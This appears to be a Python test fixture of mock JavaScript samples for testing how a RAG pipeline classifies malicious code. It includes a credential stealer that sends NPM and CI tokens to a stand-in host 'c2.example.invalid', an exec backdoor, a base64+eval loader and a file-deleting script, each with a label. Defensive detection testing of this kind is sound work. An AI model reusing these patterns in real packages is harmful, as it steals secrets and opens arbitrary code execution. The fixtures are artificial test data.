"""
Mock document dataset for RAG pipeline security tests.
FOR TESTING USE ONLY – these are minimal, safe code samples with no real payloads.

Each document mirrors the structure stored in the Qdrant vector DB:
  - id              : unique document identifier
  - code            : short, safe JavaScript/Node.js sample
  - behavior_summary: plain-text description of what the code does
  - categories      : list of source/sink group labels detected in the sample
"""

# ---------------------------------------------------------------------------
# Document 1 – Credential stealer
#   Sources : process.env, os.userInfo()
#   Sink    : https.request (POST)
# ---------------------------------------------------------------------------
DOC_CREDENTIAL_STEALER = {
    "id": "doc_001",
    "code": (
        "const os = require('os');\n"
        "const https = require('https');\n"
        "const creds = {\n"
        "  user: os.userInfo().username,\n"
        "  home: os.homedir(),\n"
        "  token: process.env.NPM_TOKEN || process.env.CI_TOKEN,\n"
        "};\n"
        "const payload = JSON.stringify(creds);\n"
        "const req = https.request(\n"
        "  { hostname: 'c2.example.invalid', path: '/collect', method: 'POST' },\n"
        "  () => {}\n"
        ");\n"
        "req.end(payload);\n"
    ),
    "behavior_summary": (
        "Credential stealer: collects the current username, home directory path, "
        "and secret tokens from process environment variables (NPM_TOKEN, CI_TOKEN). "
        "Exfiltrates the gathered data as JSON via an HTTPS POST request to a remote "
        "command-and-control host.  Matches INFORMATION_GATHERING and "
        "NETWORK_COMMUNICATION source/sink groups."
    ),
    "categories": ["INFORMATION_GATHERING", "NETWORK_COMMUNICATION"],
}

# ---------------------------------------------------------------------------
# Document 2 – Command-execution backdoor
#   Source : process.env (command argument)
#   Sink   : child_process.exec
# ---------------------------------------------------------------------------
DOC_COMMAND_BACKDOOR = {
    "id": "doc_002",
    "code": (
        "const { exec } = require('child_process');\n"
        "const cmd = process.env.BACKDOOR_CMD;\n"
        "if (cmd) {\n"
        "  exec(cmd, (err, stdout, stderr) => {\n"
        "    process.stdout.write(stdout);\n"
        "  });\n"
        "}\n"
    ),
    "behavior_summary": (
        "Command-execution backdoor: reads an arbitrary shell command from the "
        "BACKDOOR_CMD environment variable and executes it with child_process.exec. "
        "Stdout is forwarded to the process output, giving a remote caller arbitrary "
        "code-execution capability. Matches SYSTEM_COMMAND_EXECUTION and "
        "INFORMATION_GATHERING source/sink groups."
    ),
    "categories": ["SYSTEM_COMMAND_EXECUTION", "INFORMATION_GATHERING"],
}

# ---------------------------------------------------------------------------
# Document 3 – Obfuscated loader
#   Technique : base64 encoding (atob) + eval
# ---------------------------------------------------------------------------
DOC_OBFUSCATED_LOADER = {
    "id": "doc_003",
    "code": (
        "// encoded = btoa(\"console.log('loader executed')\")\n"
        "const encoded = 'Y29uc29sZS5sb2coJ2xvYWRlciBleGVjdXRlZCcp';\n"
        "eval(atob(encoded));\n"
    ),
    "behavior_summary": (
        "Obfuscated loader: conceals its real behaviour by storing a base64-encoded "
        "payload in a string literal.  At runtime, atob() decodes the payload and "
        "eval() executes it directly, bypassing most static-analysis tools.  Matches "
        "DYNAMIC_CODE_EXECUTION_AND_OBFUSCATION source/sink group."
    ),
    "categories": ["DYNAMIC_CODE_EXECUTION_AND_OBFUSCATION"],
}

# ---------------------------------------------------------------------------
# Document 4 – Destructive / anti-forensic script
#   Sinks : fs.unlink (file deletion), process.exit
# ---------------------------------------------------------------------------
DOC_DESTRUCTIVE_SCRIPT = {
    "id": "doc_004",
    "code": (
        "const fs = require('fs');\n"
        "const targets = ['/tmp/install.log', './node_modules/.cache/last-run.json'];\n"
        "targets.forEach(p => fs.unlink(p, () => {}));\n"
        "process.exit(0);\n"
    ),
    "behavior_summary": (
        "Destructive anti-forensic script: iterates over a list of file paths and "
        "deletes each one with fs.unlink, then terminates the process immediately via "
        "process.exit.  Consistent with evidence-removal or self-destruct behaviour "
        "in post-exploitation tooling. Matches FILE_OPERATIONS and "
        "ENVIRONMENT_CLEANUP source/sink groups."
    ),
    "categories": ["FILE_OPERATIONS", "ENVIRONMENT_CLEANUP"],
}

# ---------------------------------------------------------------------------
# Document 5 – Benign file reader  (low-risk baseline)
#   Only source/sink: fs.readFile
# ---------------------------------------------------------------------------
DOC_BENIGN_READER = {
    "id": "doc_005",
    "code": (
        "const fs = require('fs');\n"
        "fs.readFile('./config.json', 'utf8', (err, data) => {\n"
        "  if (err) { console.error(err); return; }\n"
        "  const cfg = JSON.parse(data);\n"
        "  console.log('Loaded config:', cfg);\n"
        "});\n"
    ),
    "behavior_summary": (
        "Benign file reader: opens a local JSON configuration file using fs.readFile, "
        "parses the content, and logs it to stdout.  No network communication, no "
        "process/environment manipulation, and no obfuscation detected.  Matches "
        "FILE_OPERATIONS source/sink group only – low risk."
    ),
    "categories": ["FILE_OPERATIONS"],
}


DOC_UNCOMPLETED_CODE_SNIPPET = {
    "id": "doc_006",
    "code": (
        " require('fs');\n"
        "fs.readFile('./config.json', 'utf8', (err, data) => {\n"
        "  if (err) { console.error(err); return; }\n"
        "  const cfg = JSON.parse(data);\n"
        "  conso"
    ),
    "behavior_summary": (
        "Uncompleted code snippet: this document contains a syntax error due to a missing closing parenthesis and brace. "
    ),
    "categories": ["FILE_OPERATIONS"],
}

# ---------------------------------------------------------------------------
# Convenience list – all documents in ranked order for easy iteration
# ---------------------------------------------------------------------------
ALL_MOCK_DOCUMENTS = [
    DOC_CREDENTIAL_STEALER,
    DOC_COMMAND_BACKDOOR,
    DOC_OBFUSCATED_LOADER,
    DOC_DESTRUCTIVE_SCRIPT,
    DOC_BENIGN_READER,
    DOC_UNCOMPLETED_CODE_SNIPPET
]